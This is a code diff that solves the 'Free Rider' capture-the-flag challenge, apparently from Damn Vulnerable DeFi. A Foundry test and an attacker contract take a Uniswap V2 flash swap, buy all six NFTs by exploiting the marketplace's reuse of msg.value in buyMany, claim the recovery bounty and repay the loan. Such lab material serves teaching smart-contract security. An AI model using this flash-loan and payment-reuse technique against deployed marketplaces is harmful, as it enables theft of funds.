@@ -122,8 +122,26 @@ contract FreeRiderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_freeRider() public checkSolvedByPlayer {
-        
+    function test_freeRider() public 
+    checkSolvedByPlayer
+    {
+        // The plan
+        /*
+        1. Flashloan from uniswap 
+        2. Buy all NFTs
+        3. Get the 45 ETH 
+        5. Still need 45 more to repay the loan
+            - try to re-offer it, the buy it again 
+        */    
+       Interacter interacter = new Interacter(address(uniswapPair), address(weth), address(marketplace), player, address(recoveryManager));
+       weth.deposit{ value:player.balance - 1 }(); // -1 cause isSolved is evaluating this to be graterthan 45e18 not equal -> to do: calculate exact fees
+       weth.transfer(address(interacter), weth.balanceOf(player));
+       uniswapPair.swap(
+        15e18,
+        0,
+        address(interacter),
+        'non-zero-length'
+       );
     }
 
     /**
@@ -145,4 +163,57 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract Interacter {
+    address uv2Pool;
+    address weth;
+    address marketplace;
+    address player;
+    address recoveryManager;
+    
+    constructor(address _uv2Pool, address _weth, address _marketplace, address _player, address _recoveryManager) {
+        uv2Pool = _uv2Pool;
+        weth = _weth;
+        marketplace = _marketplace;
+        player = _player;
+        recoveryManager = _recoveryManager;
+    }
+
+    function uniswapV2Call(address sender, uint amountOut0, uint amount1Out, bytes calldata data) public {
+        WETH _weth = WETH(payable(weth));
+        FreeRiderNFTMarketplace _marketplace = FreeRiderNFTMarketplace(payable(marketplace));
+        
+        _weth.withdraw(_weth.balanceOf(address(this)));
+
+
+        uint256[] memory ids = new uint256[](6);
+        ids[0] = 0;
+        ids[1] = 1;
+        ids[2] = 2;
+        ids[3] = 3;
+        ids[4] = 4;
+        ids[5] = 5;
+        
+        _marketplace.buyMany{ value: 15e18 }(ids);
+
+        DamnValuableNFT nft = _marketplace.token();
+        nft.safeTransferFrom(address(this), recoveryManager, 0);
+        nft.safeTransferFrom(address(this), recoveryManager, 1);
+        nft.safeTransferFrom(address(this), recoveryManager, 2);
+        nft.safeTransferFrom(address(this), recoveryManager, 3);
+        nft.safeTransferFrom(address(this), recoveryManager, 4);
+        nft.safeTransferFrom(address(this), recoveryManager, 5, abi.encode(player));
+
+        // Due to vul, I get my ETH back
+        _weth.deposit{ value:address(this).balance }();
+        _weth.transfer(uv2Pool, _weth.balanceOf(address(this)));
+    }
+
+    function onERC721Received(address,address,uint256,bytes calldata) external pure returns(bytes4) {
+        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
+    }
+
+    receive() payable external {}
+
 }
